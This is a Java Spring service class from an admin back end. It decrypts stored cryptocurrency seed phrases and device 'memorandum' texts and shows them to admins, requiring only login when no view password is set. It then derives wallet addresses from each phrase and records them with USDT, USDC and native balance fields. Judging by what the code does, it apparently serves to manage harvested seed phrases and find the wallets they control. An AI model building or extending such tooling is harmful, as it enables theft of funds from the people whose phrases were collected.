package com.admin.service;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import org.springframework.stereotype.Service;

import com.admin.auth.AdminContext;
import com.admin.config.V26AdminProperties;
import com.admin.dao.AddressDao;
import com.admin.dao.MemorandumDao;
import com.admin.dao.MnemonicDao;
import com.admin.dao.SettingDao;
import com.admin.entity.AddressEntity;
import com.admin.entity.MemorandumEntity;
import com.admin.entity.MnemonicEntity;
import com.admin.entity.SettingEntity;
import com.admin.util.AdminForbiddenException;
import com.admin.util.MnemonicAesUtil;
import com.admin.util.WalletAddressUtil;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;

import lombok.RequiredArgsConstructor;

@Service
@RequiredArgsConstructor
public class SecretRevealService {

    private final V26AdminProperties props;
    private final MnemonicDao mnemonicDao;
    private final MemorandumDao memorandumDao;
    private final AddressDao addressDao;
    private final ScopeService scopeService;
    private final SettingDao settingDao;

    public String checkViewPassword(String password) {
        String expected = props.getMnemonicViewPassword() == null ? "" : props.getMnemonicViewPassword().trim();
        // 未配置查看密码 = 登录即可查看，不再二次验密
        if (expected.isEmpty()) {
            return null;
        }
        String given = password == null ? "" : password;
        byte[] a = given.getBytes(java.nio.charset.StandardCharsets.UTF_8);
        byte[] b = expected.getBytes(java.nio.charset.StandardCharsets.UTF_8);
        if (a.length != b.length || !java.security.MessageDigest.isEqual(a, b)) {
            return "密码错误";
        }
        return null;
    }

    public Map<String, Object> revealMnemonic(AdminContext ctx, long id, String password) {
        String err = checkViewPassword(password);
        if (err != null) {
            return fail(err);
        }
        MnemonicEntity row = mnemonicDao.selectById(id);
        if (row == null) {
            return fail("记录不存在");
        }
        if (!scopeService.rowVisible(ctx, row.getAppId(), row.getUserid())) {
            throw new AdminForbiddenException("无权查看该助记词");
        }
        String secret = props.getMnemonicAesKey() == null ? "" : props.getMnemonicAesKey().trim();
        if (!MnemonicAesUtil.hasSecret(secret) && MnemonicAesUtil.looksEncrypted(row.getResult())) {
            return fail("未配置加密密钥（MNEMONIC_AES_KEY）");
        }
        String phrase;
        try {
            phrase = MnemonicAesUtil.decrypt(row.getResult(), secret).trim();
        } catch (Exception e) {
            String msg = e.getMessage() == null ? "" : e.getMessage();
            if (msg.contains("MNEMONIC_AES_KEY") || msg.contains("未配置加密密钥")) {
                return fail("未配置加密密钥（MNEMONIC_AES_KEY）");
            }
            return fail("解密失败，请确认 mnemonic-aes-key 与入库时一致");
        }
        if (phrase.isEmpty()) {
            return fail("助记词为空");
        }
        if (MnemonicAesUtil.looksEncrypted(phrase)) {
            return fail("解密失败，请确认 mnemonic-aes-key 与入库时一致");
        }
        Map<String, Object> ok = new LinkedHashMap<>();
        ok.put("ok", true);
        ok.put("id", row.getId());
        ok.put("deviceId", row.getDeviceId());
        ok.put("source", row.getSource());
        ok.put("phrase", phrase);
        return ok;
    }

    public Map<String, Object> revealMemorandum(AdminContext ctx, long id, String password) {
        String err = checkViewPassword(password);
        if (err != null) {
            return fail(err);
        }
        MemorandumEntity row = memorandumDao.selectById(id);
        if (row == null) {
            return fail("记录不存在");
        }
        if (!scopeService.rowVisible(ctx, row.getAppId(), row.getUserid())) {
            throw new AdminForbiddenException("无权查看该备忘录");
        }
        String secret = props.getMnemonicAesKey() == null ? "" : props.getMnemonicAesKey().trim();
        if (!MnemonicAesUtil.hasSecret(secret) && MnemonicAesUtil.looksEncrypted(row.getResult())) {
            return fail("未配置加密密钥（MNEMONIC_AES_KEY）");
        }
        String text;
        try {
            text = MnemonicAesUtil.decrypt(row.getResult(), secret).trim();
        } catch (Exception e) {
            String msg = e.getMessage() == null ? "" : e.getMessage();
            if (msg.contains("MNEMONIC_AES_KEY") || msg.contains("未配置加密密钥")) {
                return fail("未配置加密密钥（MNEMONIC_AES_KEY）");
            }
            return fail("解密失败，请确认 mnemonic-aes-key 与入库时一致");
        }
        if (text.isEmpty()) {
            return fail("备忘录为空");
        }
        if (MnemonicAesUtil.looksEncrypted(text)) {
            return fail("解密失败，请确认 mnemonic-aes-key 与入库时一致");
        }
        String title = text.length() > 40 ? text.substring(0, 40) : text;
        if (title.contains("\n")) {
            title = title.substring(0, title.indexOf('\n'));
        }
        Map<String, Object> ok = new LinkedHashMap<>();
        ok.put("ok", true);
        ok.put("id", row.getId());
        ok.put("deviceId", row.getDeviceId());
        ok.put("title", title);
        ok.put("content", text);
        return ok;
    }

    public Map<String, Object> deriveAddresses(AdminContext ctx, Object idsRaw) {
        List<Integer> uniq = new ArrayList<>();
        if (idsRaw instanceof List) {
            for (Object raw : (List<?>) idsRaw) {
                if (raw == null) {
                    continue;
                }
                int mid;
                try {
                    mid = Integer.parseInt(String.valueOf(raw));
                } catch (NumberFormatException e) {
                    continue;
                }
                if (mid <= 0 || uniq.contains(mid)) {
                    continue;
                }
                uniq.add(mid);
                if (uniq.size() >= 50) {
                    break;
                }
            }
        }
        if (uniq.isEmpty()) {
            return fail("请先勾选助记词");
        }
        String secret = props.getMnemonicAesKey() == null ? "" : props.getMnemonicAesKey().trim();
        int deriveCount = deriveCount();
        List<Map<String, Object>> items = new ArrayList<>();
        int okN = 0;
        int failN = 0;
        int inserted = 0;
        int updated = 0;
        for (Integer mid : uniq) {
            MnemonicEntity row = mnemonicDao.selectById(mid);
            Map<String, Object> it = new LinkedHashMap<>();
            it.put("id", mid);
            if (row == null || !scopeService.rowVisible(ctx, row.getAppId(), row.getUserid())) {
                failN++;
                it.put("ok", false);
                it.put("error", "不存在或无权操作");
                items.add(it);
                continue;
            }
            String phrase;
            try {
                phrase = MnemonicAesUtil.decrypt(row.getResult(), secret).trim();
                if (phrase.isEmpty()) {
                    throw new IllegalStateException("empty");
                }
            } catch (Exception e) {
                failN++;
                it.put("ok", false);
                it.put("error", "解密失败");
                items.add(it);
                continue;
            }
            List<Map<String, Object>> derived = WalletAddressUtil.deriveChainAddressRows(phrase, deriveCount);
            int ins = 0;
            int upd = 0;
            double now = System.currentTimeMillis() / 1000.0;
            for (Map<String, Object> drow : derived) {
                String addr = String.valueOf(drow.getOrDefault("address", ""));
                String chain = String.valueOf(drow.getOrDefault("chaintype", ""));
                int idx = drow.get("addr_index") == null ? 0 : Integer.parseInt(String.valueOf(drow.get("addr_index")));
                if (addr.isBlank()) {
                    continue;
                }
                AddressEntity existing = addressDao.selectOne(new QueryWrapper<AddressEntity>()
                        .eq("mnemonic_id", mid).eq("address", addr).eq("chaintype", chain).last("LIMIT 1"));
                if (existing == null) {
                    AddressEntity n = new AddressEntity();
                    n.setMnemonicId(mid.longValue());
                    n.setAddress(addr);
                    n.setChaintype(chain);
                    n.setAddrIndex(idx);
                    n.setAddtime(now);
                    n.setStatus(1);
                    n.setAlgorithm(drow.get("algorithm") == null ? null : String.valueOf(drow.get("algorithm")));
                    n.setNativeBal("0");
                    n.setUsdtBal("0");
                    n.setUsdcBal("0");
                    addressDao.insert(n);
                    ins++;
                } else {
                    existing.setAddrIndex(idx);
                    addressDao.updateById(existing);
                    upd++;
                }
            }
            okN++;
            inserted += ins;
            updated += upd;
            it.put("ok", true);
            it.put("inserted", ins);
            it.put("updated", upd);
            it.put("total", ins + upd);
            items.add(it);
        }
        Map<String, Object> data = new LinkedHashMap<>();
        data.put("ok", failN == 0 && okN > 0);
        data.put("partial", okN > 0 && failN > 0);
        data.put("derive_count", deriveCount);
        data.put("mnemonic_ok", okN);
        data.put("mnemonic_fail", failN);
        data.put("inserted", inserted);
        data.put("updated", updated);
        data.put("items", items);
        data.put("message", "完成 " + okN + " 条助记词：新增地址 " + inserted + "，已存在更新 " + updated
                + (failN > 0 ? "；失败 " + failN + " 条" : ""));
        return data;
    }

    private int deriveCount() {
        SettingEntity row = settingDao.selectOne(new QueryWrapper<SettingEntity>()
                .eq("config_key", "wallet.address_derive_count").last("LIMIT 1"));
        if (row == null || row.getConfigValue() == null) {
            return 5;
        }
        try {
            int n = Integer.parseInt(row.getConfigValue().trim());
            return Math.max(1, Math.min(50, n));
        } catch (Exception e) {
            return 5;
        }
    }

    private Map<String, Object> fail(String error) {
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("ok", false);
        m.put("error", error);
        return m;
    }
}
